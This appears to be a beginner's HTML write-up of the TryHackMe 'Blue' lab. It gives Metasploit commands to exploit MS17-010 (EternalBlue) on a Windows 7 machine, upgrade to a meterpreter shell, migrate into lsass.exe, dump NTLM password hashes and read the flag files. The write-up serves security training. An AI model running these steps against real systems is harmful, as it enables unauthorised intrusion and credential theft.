@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>My first write-up</title>
+</head>
+<body>
+
+    <div class="WordSection1" style="color:white;background-color:black;">
+
+        <p class="MsoNormal"><center><b><span style="font-size:24.0pt;line-height:107%;
+        font-family:&quot;Times New Roman&quot;,serif">TryHackMe : Blue</span></b></center></p>
+        
+        <p class="MsoNormal">&nbsp;</p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">So, this my
+        first write-up of any machine. Today, we are going to find the flags from a
+        Windows machine named Blue on <a href="http://www.tryhackme.com">www.tryhackme.com</a>
+        platform. </span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">I am using
+        Kali Linux for penetrating this machine.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Let’s start
+        penetrating……</span></p>
+        
+        <p class="MsoNormal">&nbsp;</p>
+        
+        <p class="MsoNormal"><b><span style="font-size:20.0pt;line-height:107%">Task 1-</span></b><span style="font-size:20.0pt;line-height:107%"> Recon</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:18.0pt;line-height:107%">Let’s start
+        with scanning our machine.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;nmap&nbsp; -
+        Pn&nbsp; &lt;machine-ip&gt;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="561" height="154" id="Picture 1" src="1.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">We can see
+        that we have 5 open ports here. </span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Now let’s
+        see if the machine has some vulnerabilities. This can be done by running the command-</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;nmap&nbsp;
+        -Pn&nbsp; --script vuln &lt;machine-ip&gt;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="572" height="353" id="Picture 2" src="2.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">We can see
+        here that the machine is vulnerable to ms17-010, otherwise known as Eternal
+        Blue! We can exploit this to run arbitrary code on the target system.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><b><span style="font-size:20.0pt;line-height:107%">Task 2 – </span></b><span style="font-size:20.0pt;line-height:107%">Gain Access</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:20.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Now, let’s
+        start metasploit.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="623" height="320" src="3.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Search for
+        ms17-010-</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;search
+        ms17-010</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="628" height="232" src="4.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Because the
+        machine is windows 7. Let’s try “windows/smb/ms17_010_eternalblue”</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="620" height="293" src="5.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">We can see
+        that we have to set the RHOSTS and run the exploit.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">So, let’s do
+        that-</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;set
+        RHOSTS &lt;machine-ip&gt;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="591" height="69" src="6.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="645" height="306" src="7.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Kudos!!</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">We got the
+        shell. Run whoami command on the shell and verify.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Confirm that
+        the exploit has run correctly. You may have to press enter for the DOS shell to
+        appear. Background this shell (CTRL + Z). If this failed, you may have to
+        reboot the target machine. Try running it again before a reboot of the target.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><b><span style="font-size:20.0pt;line-height:107%">Task 3 </span></b><span style="font-size:16.0pt;line-height:107%">– </span><span style="font-size:20.0pt;
+        line-height:107%">Escalate</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">If
+        you haven’t already, background the previously gained shell (CTRL + Z).</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Back
+        to metasploit first</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Verify
+        the sessions</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&gt;sessions</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt"><img border="0" width="624" height="28" src="8.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">We're going
+        to upgrade it to a meterpreter shell, something quite a bit more powerful for
+        our purposes!</span></p>
+        
+        <pre><span style="font-size:16.0pt">&gt;</span><span style="font-size:16.0pt;
+        font-family:&quot;Calibri&quot;,sans-serif">use multi/manage/shell_to_meterpreter</span></pre>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="620" height="44" src="9.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Now, let’s
+        see our options.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;show
+        options</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="622" height="170" src="10.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Let’s set
+        the LPORT and the SESSION and run the exploit.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;set
+        LPORT 4433</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;set
+        session 1</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="620" height="184" src="11.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Once the
+        meterpreter shell conversion completes, select that session for use.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Verify the
+        sessions….</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;sessions</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="628" height="137" src="12.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;sessions
+        2</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="630" height="94" src="13.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Verify that
+        we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel
+        free to open a dos shell via the command ‘shell’ and run ‘whoami’. This should
+        return that we are indeed system. Background this shell afterwards and select
+        our meterpreter session for usage again.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;getsystem</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="623" height="51" src="14.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;shell</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="584" height="131" src="15.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">Press
+        “ctrl+z” to go back to meterpreter</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="583" height="95" src="16.JPG"></span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">List all of
+        the processes running via the ‘ps’ command. Just because we are system doesn’t
+        mean our process is. Find a process towards the bottom of this list that is
+        running at NT AUTHORITY\SYSTEM.</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&gt;ps</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%"><img border="0" width="584" height="380" src="17.JPG"></span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">Migrate to this process using the ‘migrate
+        PROCESS_ID’ command where the process id is the one you just wrote down in the
+        previous step. This may take several attempts, migrating processes is not very
+        stable. If this fails, you may need to re-run the conversion process or reboot
+        the machine and start once again. If this happens, try a different process next
+        time.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">Migrate to lsass.exe</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">&gt;migrate 712</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">We will migrate to process id 712 which is
+        lsass.exe.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><b><span style="font-size:20.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">Task 4</span></b><span style="font-size:
+        16.0pt;font-family:&quot;Times New Roman&quot;,serif"> – </span><span style="font-size:
+        20.0pt;font-family:&quot;Times New Roman&quot;,serif">Cracking</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Within
+        our meterpreter shell, run the command ‘hashdump’. This will dump all of the
+        passwords on the machine as long as we have the correct privileges to do so. </span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&gt;hashdump</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt"><img border="0" width="623" height="113" src="18.JPG"></span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Copy
+        this password hash to a file and research how to crack it. Windows uses NTLM
+        hashing for passwords.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">To
+        crack the password we can google for online websites for cracking NTLM hashing
+        or we can use hashcat which is pre-installed in Kali Linux.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><b><span style="font-size:20.0pt">Task
+        5</span></b><span style="font-size:16.0pt"> – </span><span style="font-size:
+        20.0pt">Find Flags!</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Flag1?
+        (Only submit the flag contents {CONTENTS})<br>
+        Flag1 is located in C:\</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt"><img border="0" width="624" height="266" src="19.JPG"></span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">We
+        can use the command cat to display the flag</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&gt;cat
+        flag1.txt</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Flag2?
+        *Errata: Windows really doesn’t like the location of this flag and can
+        occasionally delete it. It may be necessary in some cases to terminate/restart
+        the machine and rerun the exploit to find this flag.<br>
+        Flag2 is located in “C:\Windows\System32\config”. </span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&gt;cat
+        flag2.txt</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Flag3
+        is located in “C:\Users\Jon\Documents”. </span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&gt;cat
+        flag3.txt</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">I
+        hope you got a good walkthrough by this write-up.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Forgive
+        me if I have done any mistakes as this is my first write-up of any machine.</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Thankyou!!!!!!</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">&nbsp;</span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt">Write-up
+        by </span><b><span style="font-size:16.0pt;font-family:&quot;Blackadder ITC&quot;">Tejas
+        Anand</span></b></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt"><br>
+        <br>
+        </span></p>
+        
+        <p class="MsoNormal" style="line-height:normal"><span style="font-size:16.0pt;
+        font-family:&quot;Times New Roman&quot;,serif">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        <p class="MsoNormal"><span style="font-size:16.0pt;line-height:107%">&nbsp;</span></p>
+        
+        </div>
+
+
+
+
+</body>
+</html>
